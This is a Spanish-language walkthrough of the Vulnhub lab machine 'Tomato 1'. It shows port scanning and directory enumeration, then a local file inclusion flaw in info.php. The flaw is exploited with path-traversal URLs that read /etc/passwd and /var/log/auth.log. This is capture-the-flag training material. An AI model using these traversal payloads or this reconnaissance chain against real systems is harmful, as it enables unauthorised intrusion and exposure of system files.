<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=3CF700FF&width=300&height=80&lines=TOMATO_1"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/tomato-1,557/

</br>

- *Paso 1:* Identificar la IP de la máquina host con NetDiscover. 
```
netdiscover -i eth0
```
![1](https://user-images.githubusercontent.com/75953873/174927688-71985557-4e9d-4790-acac-a8b1da611f48.png)

IP host: `192.168.1.10`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.10
```
![2](https://user-images.githubusercontent.com/75953873/174929092-202e91f9-f6d3-428b-a8f9-a952095f67f8.png)

Puertos abiertos: [21,80,2211,8888]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 21,80,2211,8888 -A 192.168.1.10
```
![3](https://user-images.githubusercontent.com/75953873/174929490-44875da3-9b11-4e39-ba9d-0d7be8d85aac.png)

Servidor corriendo: **HTTP Apache**

O.S: Linux (**Ubuntu**)

URL del servidor: `http://192.168.1.10`

![4](https://user-images.githubusercontent.com/75953873/174928906-0bf0a1e9-d580-4d8f-ae94-0c0bbb3a73b6.png)

En el puerto `8888` se encuentra corriendo el servidor Nginx (`http:192.168.1.10:8888`).

![5](https://user-images.githubusercontent.com/75953873/174929899-11ad2340-d883-4fff-8eb2-d68a7dd8b67d.png)

- *Paso 4:* Enumerar archivos y directorios con Dirb. 
```
dirb http://192.168.1.10 /usr/share/dirb/wordlists/common.txt
```
![6](https://user-images.githubusercontent.com/75953873/174931398-0e9f0007-7245-408a-b4d1-d89c6f3e30ae.png)

Directorio: `http://192.168.1.10/antibot_image/`

Al inspeccionar el código del archivo `info.php`, indica en un comentario que es posible subir una imagen con el método GET.
```
curl http://192.168.1.10/antibot_image/antibots/info.php
```
![7](https://user-images.githubusercontent.com/75953873/174932206-434978d3-3417-4eb4-bd3f-cbce7b934c87.png)

- *Paso 5:* Búsqueda de vulnerabilidad LFI (Inclusión de archivos locales).

Herramienta Tester: https://github.com/kostas-pa/LFITester

LFI Payloads: https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt

```
python3 LFITester.py -L payloads.txt
```
![9](https://user-images.githubusercontent.com/75953873/174938168-ec6ee35f-6eaf-4d05-937a-ada4e7db7e84.png)

URL: 
```
Opción 1) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../etc/passwd
Opción 2) http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log
```

**/etc/passwd**

![8_](https://user-images.githubusercontent.com/75953873/174938823-970ad267-3267-4bbe-9f97-d256d4f5b2e2.png)

**/var/log/auth.log**

![10](https://user-images.githubusercontent.com/75953873/174939217-162ae75c-1412-48dd-98ab-142100bf6e95.png)
